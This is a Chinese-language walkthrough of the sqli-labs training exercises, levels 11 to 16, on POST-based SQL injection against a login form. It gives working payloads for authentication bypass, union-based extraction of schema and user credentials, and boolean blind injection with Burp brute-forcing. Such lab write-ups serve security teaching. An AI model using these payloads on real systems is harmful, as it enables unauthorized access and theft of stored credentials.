
# Sqli-labs-Less-11
**从第十一关开始就与前面有所不同，在这里需要使用post**<br />![](https://img-blog.csdnimg.cn/20200718173003382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Zc74w&originHeight=294&originWidth=675&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**首先账户和密码我们输入admin进行登录，显示登录成功，并且有回显。**<br />![](https://img-blog.csdnimg.cn/20200718173139479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Nve8s&originHeight=556&originWidth=729&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在这里你会发现使用http://www.web.com/sql/Less-11/?id=1' --+这种格式的并没有用，用为这里是使用post进行传输的，我们需要使用burp来捕获post内容。

打开burp再次使用burp进行登录，会在burp中看到<br />![](https://img-blog.csdnimg.cn/20200718173708194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=usQPq&originHeight=264&originWidth=564&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

将它复制到<br />![](https://img-blog.csdnimg.cn/20200718205853513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=cpNgn&originHeight=448&originWidth=1261&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

将uname上的admin删掉输入上' or 1=1 #（在这里只能使用#号来进行注释），登录成功，说明此处存在注入点。<br />uname=' or 1=1 #&passwd=admin&submit=Submit<br />A or B or是或的意思，只要是A或B有一个为真，则返回真<br />![](https://img-blog.csdnimg.cn/20200718210411636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=DsC4B&originHeight=332&originWidth=870&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**使用order by 查看字段数量**<br />uname=a' order by 3 #&passwd=admin&submit=Submit 回显错误<br />uname=a' order by 2 #&passwd=admin&submit=Submit 回显正确<br />说明有2列

**查看数据库名称以及版本**<br />uname=a' union select database(),version() #&passwd=admin&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200718211006523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=H9w1K&originHeight=313&originWidth=743&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有数据库**<br />使用group_concat()连接<br />uname=a' union select 1,group_concat(schema_name) from information_schema.schemata #&passwd=admin&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200718211235575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=g2h9o&originHeight=302&originWidth=1034&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有表**<br />uname=a' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' #&passwd=admin&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200718211346134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=h0UYl&originHeight=321&originWidth=965&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看users字段**<br />uname=a' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #&passwd=admin&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200718211454619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=pQeQ7&originHeight=345&originWidth=1615&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看username和password，使用concat_ws()函数分割**<br />uname=a' union select 1,group_concat(concat_ws('-',username,password)) from security.users #&passwd=admin&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200718211704100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=LWmmz&originHeight=352&originWidth=1822&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**到此我们就已经拿到所有的用户账号和密码。**


# Sqli-labs-Less-12
**查找注入点**<br />当我们使用uname=' or 1=1#&passwd=admin&submit=Submit<br />未登录说明不正确<br />![](https://img-blog.csdnimg.cn/20200718212616503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=waCxk&originHeight=203&originWidth=1069&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

当我们使用uname=" or 1=1#&passwd=admin&submit=Submit<br />报错并未登录<br />![](https://img-blog.csdnimg.cn/20200718212518526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=HKlme&originHeight=270&originWidth=1481&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

当我们使用uname=") or 1=1#&passwd=admin&submit=Submit<br />登录成功说明此处存在注入点<br />![](https://img-blog.csdnimg.cn/20200718212732242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=YIRF1&originHeight=337&originWidth=779&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**以下步骤与Sqli-labs-Less-11相同不进行详细叙述**


# Sqli-labs-Less-13
**查找注入点（这里就不绕弯子了，查找注入点无非就那几点**）<br />uname=') or 1=1#&passwd=admin&submit=Submit<br />显示登录成功，但是并没有数据回显，说明这里需要**盲注**<br />![](https://img-blog.csdnimg.cn/20200718213940653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=yst0p&originHeight=536&originWidth=1631&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**猜测数据库名称长度**<br />uname=') or length(database())=8#&passwd=admin&submit=Submit<br />当使用8时 显示登录成功，说明数据库名称长度为8。<br />![](https://img-blog.csdnimg.cn/20200718214357155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=LDRBu&originHeight=557&originWidth=1583&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断数据库名称**<br />uname=') or substr((select database()),1,1)='s'#&passwd=admin&submit=Submit<br />登录成功，说明数据库首字母为s<br />![](https://img-blog.csdnimg.cn/20200718215611781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=hiTY5&originHeight=601&originWidth=1503&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**使用burp爆破**<br />![](https://img-blog.csdnimg.cn/20200718214750894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=BDe9c&originHeight=289&originWidth=850&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断表名**<br />uname=') or substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e'#&passwd=admin&submit=Submit<br />登录成功，说明第一个表首字母为e<br />![](https://img-blog.csdnimg.cn/20200718215423630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=X81d2&originHeight=549&originWidth=1330&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
使用 burp爆破<br />![](https://img-blog.csdnimg.cn/20200718215544520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=jR8wz&originHeight=285&originWidth=832&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断用户名和密码（users表）将账户和密码使用concat_ws()函数连接一起查询**<br />uname=') or substr((select concat_ws('-',username,password) from security.users limit 0,1),1,1)='d'#&passwd=admin&submit=Submit<br />登录成功，说明第一个用户的首字母为d<br />![](https://img-blog.csdnimg.cn/20200718220541417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=oJBDP&originHeight=535&originWidth=1369&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
使用burp爆破<br />![](https://img-blog.csdnimg.cn/20200718220714768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=JvXPs&originHeight=338&originWidth=868&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

以此类推破解出所有的账户和密码。


# Sqli-labs-Less-14
**查找注入点（老生常谈，不多说）**<br />uname=" or 1=1 #&passwd=admin&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200719100435618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=RPBSZ&originHeight=485&originWidth=1105&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**这里也没有数据回显与Sqli-labs-Less-13一样需要盲注**<br />以下步骤与Sqli-labs-Less-13相同<br />注意：<br />Sqli-labs-Less-13中是：uname=') or 1=1 #&passwd=admin&submit=Submit<br />Sqli-labs-Less-14中是：uname=" or 1=1 #&passwd=admin&submit=Submit


# Sqli-labs-Less-15
**查找注入点（老生常谈，不多说）**<br />uname=' or 1=1 #&passwd=admin&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200719101809353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=sQcWQ&originHeight=459&originWidth=1069&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**这里也没有数据回显与Sqli-labs-Less-13一样需要盲注<br />以下步骤与Sqli-labs-Less-13相同**<br />注意：<br />Sqli-labs-Less-13中是：uname=’) or 1=1 #&passwd=admin&submit=Submit<br />Sqli-labs-Less-15中是：uname=' or 1=1 #&passwd=admin&submit=Submit


# Sqli-labs-Less-16
**查找注入点（老生常谈，不多说）**<br />uname="） or 1=1 #&passwd=admin&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200719102119856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=YUXSk&originHeight=466&originWidth=918&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**这里也没有数据回显与Sqli-labs-Less-13一样需要盲注**<br />以下步骤与Sqli-labs-Less-13相同<br />注意：<br />Sqli-labs-Less-13中是：uname=' or 1=1 #&passwd=admin&submit=Submit<br />Sqli-labs-Less-16中是：uname="） or 1=1 #&passwd=admin&submit=Submit
